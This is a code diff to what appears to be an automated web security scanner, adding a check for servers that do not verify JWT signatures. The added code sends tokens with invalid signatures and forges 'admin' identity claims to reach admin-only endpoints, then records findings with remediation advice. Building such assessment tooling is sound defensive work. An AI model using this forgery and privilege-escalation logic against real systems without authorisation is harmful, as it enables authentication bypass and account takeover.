@@ -141,9 +141,15 @@ def _sim(a: str, b: str) -> bool:
 
 _PROT_PATHS = ("/me", "/api/me", "/api/users/me", "/profile", "/api/profile", "/account",
                "/rest/user/whoami", "/api/user", "/user", "/dashboard", "/api/auth/whoami",
+               "/my-account", "/account/settings", "/settings", "/admin", "/admin/",
                "/api/auth/jwt/validate", "/api/auth/jwt/hmac/validate",
                "/api/auth/jwt/weak-key/validate", "/api/auth/jwt/kid-sql/validate",
                "/api/auth/jwt/rsa/signature/validate")
+# admin-only endpoints + identity-claim fields used by the unverified-signature privesc probe
+_ADMIN_PATHS = ("/admin", "/admin/", "/administrator", "/admin/delete", "/api/admin",
+                "/admin/users", "/manage", "/dashboard/admin")
+_ADMIN_VALUES = ("administrator", "admin")
+_ID_CLAIMS = ("sub", "username", "user", "name", "preferred_username", "email", "uid", "login")
 
 
 def _candidates(inventory, target) -> list[str]:
@@ -390,6 +396,109 @@ def _file(assessment_id, url, kind, token, forged, detail, log):
         s.commit()
 
 
+def _file_nosig(assessment_id, url, kind, token, forged, detail, log):
+    """File a 'signature not verified' / unverified-signature-privesc finding with wording that
+    matches the anon-denied vs forged-accepted differential (NOT the reject-bad-sig oracle)."""
+    from owlforge.store.db import session
+    from owlforge.store.models import Finding
+    with session() as s:
+        s.add(Finding(
+            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
+            title=f"JWT authentication bypass — {kind}", severity="critical",
+            status="validated", confidence="high", endpoint=url, method="GET",
+            technical_analysis=detail,
+            proof_of_concept=f"forged token accepted at GET {url}\n\n{forged}",
+            impact="Full authentication bypass / account takeover: with the signature unchecked an "
+                   "attacker forges any identity or privilege.",
+            remediation="Verify the JWT signature on every request with a pinned algorithm and the "
+                        "correct key; reject any token whose signature does not validate.",
+            validation_note="anonymous request denied but an invalid-signature/forged token was "
+                            "accepted (deterministic differential)",
+            success_signal=kind))
+        s.commit()
+
+
+def _privesc_via_nosig(assessment_id, sandbox, inventory, target, headers, token, header,
+                       payload, orig_sig, log) -> int:
+    """Headline of the unverified-signature class: forge an admin identity in the payload, leave an
+    invalid signature, and reach an admin-only endpoint that the real user's token is DENIED."""
+    from urllib.parse import urlsplit
+
+    from owlforge.engine.validate import _looks_like_login
+    origin = "{0.scheme}://{0.netloc}".format(urlsplit(target))
+    bad = "x" * max(4, len(orig_sig or ""))
+    admins = [it["url"] for it in (inventory or [])
+              if it.get("url") and "admin" in (it["url"] or "").lower()
+              and (it.get("method") or "GET").upper() == "GET"]
+    admins += [origin + pth for pth in _ADMIN_PATHS]
+    for url in dict.fromkeys(admins):
+        plain = _req(sandbox, url, headers)
+        sp, bp = int(plain.get("status") or 0), plain.get("body") or ""
+        if sp == 0 or (200 <= sp < 300 and not _looks_like_login(bp)):
+            continue                                   # not denied to the real token -> no proof
+        for adminval in _ADMIN_VALUES:
+            esc = dict(payload)
+            for k in _ID_CLAIMS:
+                if k in esc:
+                    esc[k] = adminval
+            esc.setdefault("sub", adminval)
+            si = (_b64e(json.dumps(header, separators=(",", ":")).encode()) + "." +
+                  _b64e(json.dumps(esc, separators=(",", ":")).encode()))
+            forged = si + "." + bad
+            r = _req(sandbox, url, _swap(headers, token, forged))
+            st, bd = int(r.get("status") or 0), r.get("body") or ""
+            if 200 <= st < 300 and not _looks_like_login(bd):
+                _file_nosig(assessment_id, url,
+                            f"privilege escalation to '{adminval}' via unverified signature",
+                            token, forged,
+                            f"Forging an admin identity ('{adminval}') in the JWT payload and "
+                            f"leaving an invalid signature granted access to {url}, which the real "
+                            "user's token is denied — admin takeover via the unverified-signature "
+                            "flaw.", log)
+                return 1
+    return 0
+
+
+def _unverified_sig_scan(assessment_id, sandbox, inventory, target, headers, token, header,
+                         payload, log) -> int:
+    """Detect a server that does NOT verify the JWT signature (PortSwigger 'unverified signature'
+    class). The reject-bad-sig oracle the other forgeries use is impossible here (a bad signature
+    is accepted), so this runs its own sound differential: on an endpoint where the real token is
+    accepted but an ANONYMOUS request is DENIED (so it is genuinely token-gated), present the same
+    payload with an INVALID signature — acceptance proves the signature is unchecked. Then try to
+    escalate identity to admin on an admin-only endpoint."""
+    from owlforge.engine.validate import _looks_like_login
+    si = token.rsplit(".", 1)[0]
+    orig_sig = token.rpartition(".")[2] or "AAAA"
+    same_badsig = si + "." + "x" * max(4, len(orig_sig))   # unchanged payload, invalid signature
+    anon_headers = {k: v for k, v in (headers or {}).items()
+                    if k.lower() not in ("authorization", "cookie")}
+    filed = 0
+    for url in _candidates(inventory, target):
+        real = _req(sandbox, url, headers)
+        sr, br = int(real.get("status") or 0), real.get("body") or ""
+        if not (200 <= sr < 300) or _looks_like_login(br):
+            continue
+        anon = _req(sandbox, url, anon_headers)
+        sa, ba = int(anon.get("status") or 0), anon.get("body") or ""
+        anon_denied = (sa in (401, 403)) or _looks_like_login(ba) or (sa != sr) or not _sim(br, ba)
+        if not anon_denied:
+            continue                                   # not token-gated -> cannot conclude safely
+        rb = _req(sandbox, url, _swap(headers, token, same_badsig))
+        sbv, bb = int(rb.get("status") or 0), rb.get("body") or ""
+        if not (sbv == sr and sbv < 400 and not _looks_like_login(bb) and _sim(br, bb)):
+            continue                                   # signature IS checked here -> no finding
+        _file_nosig(assessment_id, url, "signature not verified", token, same_badsig,
+                    f"An invalid-signature token was accepted at {url} exactly like the valid "
+                    "token, while an unauthenticated request was denied — the server does not "
+                    "verify the JWT signature, so any identity or claim can be forged.", log)
+        filed += 1
+        filed += _privesc_via_nosig(assessment_id, sandbox, inventory, target, headers, token,
+                                    header, payload, orig_sig, log)
+        break
+    return filed
+
+
 def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                     log: Callable[[str], None] = lambda m: None, target: str = "") -> int:
     """Forge JWTs (alg:none, weak HMAC secret) and confirm each against a live oracle. Works
@@ -433,6 +542,10 @@ def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                                   "An RSA-family forgery was accepted (confusion or header-"
                                   "carried key).", log)
                             filed += 1
+            # 'unverified signature' class: runs with OR without the reject-bad-sig oracle, since a
+            # server that ignores the signature makes that oracle impossible to find.
+            filed += _unverified_sig_scan(assessment_id, sandbox, inventory, target,
+                                          session_headers, token, header, payload, log)
 
     # token-less flow: any JWT-guarded endpoint that rejects a bad sig but accepts alg:none
     for hit in _synthetic_alg_none(sandbox, inventory, target, hit_urls, log):
